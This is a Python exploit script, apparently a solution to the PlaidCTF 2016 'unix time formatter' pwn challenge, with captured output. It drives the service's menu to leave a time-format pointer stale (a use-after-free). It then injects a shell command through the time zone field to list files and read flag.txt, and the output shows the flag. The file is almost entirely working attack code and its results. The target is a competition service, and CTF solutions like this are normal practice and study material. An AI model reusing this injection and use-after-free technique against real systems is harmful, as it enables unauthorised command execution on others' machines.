#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# PlaidCTF 2016 - unix time formatter (pwn 76)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib


# --------------------------------------------------------------------------------------------------
def recv_until(st):                             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)

  return ret

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":

    s = socket.create_connection(('unix.pwning.xxx', 9999))     # connect to server
    #s = socket.create_connection(('localhost', 7777))

    cmd = "/bin/ls -la"                                         # command to execute
    cmd = "/bin/cat flag.txt"


    recv_until("5) Exit.\n>"); s.sendall( '1'    + '\n' )
    recv_until("Format:");     s.sendall( 'd'*(len(cmd)+8) + '\n' )
    recv_until("5) Exit.\n>"); s.sendall( '5'    + '\n' )       # time format pointer is stale
    recv_until("exit (y/N)?"); s.sendall( 'N'    + '\n' )
    recv_until("5) Exit.\n>"); s.sendall( '3'    + '\n' )
    recv_until("Time zone:");  s.sendall( "QQQQ';" + cmd + " #" + '\n' )    
    recv_until("5) Exit.\n>"); s.sendall( '4'    + '\n' )       # trigger shell command

    print recv_until("5) Exit.\n>");                            # print command

    s.close()

    exit(0)
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/plaidctf# ./unix_time_format_expl.py 
    Your formatted time is: QQQQ
    total 40
    drwxr-xr-x 2 root    root     4096 Apr 16 15:03 .
    drwxr-xr-x 4 root    root     4096 Apr 16 14:58 ..
    -rw-r--r-- 1 problem problem   220 Apr 16 14:58 .bash_logout
    -rw-r--r-- 1 problem problem  3771 Apr 16 14:58 .bashrc
    -rw-r--r-- 1 problem problem   675 Apr 16 14:58 .profile
    -rw-r--r-- 1 root    root       33 Apr 16 15:01 flag.txt
    -rwxr-xr-x 1 root    root    10488 Apr 16 14:58 unix_time_formatter
    -rwxr-xr-x 1 root    root      229 Apr 16 15:02 wrapper
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 

root@nogirl:~/ctf/plaidctf# ./unix_time_format_expl.py 
    Your formatted time is: QQQQ
    PCTF{use_after_free_isnt_so_bad}
    1) Set a time format.
    2) Set a time.
    3) Set a time zone.
    4) Print your time.
    5) Exit.
    > 
'''
# --------------------------------------------------------------------------------------------------
